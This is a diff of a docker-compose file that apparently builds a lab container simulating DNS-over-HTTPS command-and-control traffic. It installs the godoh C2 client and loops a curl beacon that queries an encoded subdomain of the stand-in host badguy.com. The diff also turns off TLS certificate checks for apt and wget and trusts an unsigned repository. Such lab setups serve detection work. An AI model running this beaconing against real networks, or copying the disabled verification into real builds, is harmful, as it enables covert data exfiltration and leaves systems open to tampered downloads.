@@ -372,15 +372,16 @@ services:
       - -c
       - |
         ## Install packages
-        apt update && apt install -y wget curl jq dnsutils net-tools iputils-ping
+        apt -o "Acquire::https::Verify-Peer=false" update && apt install -y wget curl jq dnsutils net-tools iputils-ping
         
         ## Install q (DoH) client
         echo 'deb [trusted=yes] https://repo.natesales.net/apt /' > /etc/apt/sources.list.d/natesales.list
-        apt update && apt install -y q
+        apt -o "Acquire::https::Verify-Peer=false" update
+        apt -o "Acquire::https::Verify-Peer=false" install q
 
         ## Install godoh c2 (client)
         mkdir /godoh
-        wget https://github.com/sensepost/godoh/releases/download/1.6/godoh-linux64 -O /godoh/godoh
+        wget https://github.com/sensepost/godoh/releases/download/1.6/godoh-linux64 --no-check-certificate -O /godoh/godoh
         chmod +x /godoh/godoh
 
         ## Spoof cloudflare-dns.com to local DoH server
@@ -401,7 +402,7 @@ services:
           do
             curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=396c396336.badguy.com&type=16'
             i=$$((i + 1))
-            sleep 20
+            sleep 10
           done
 
           ## Sleep 10
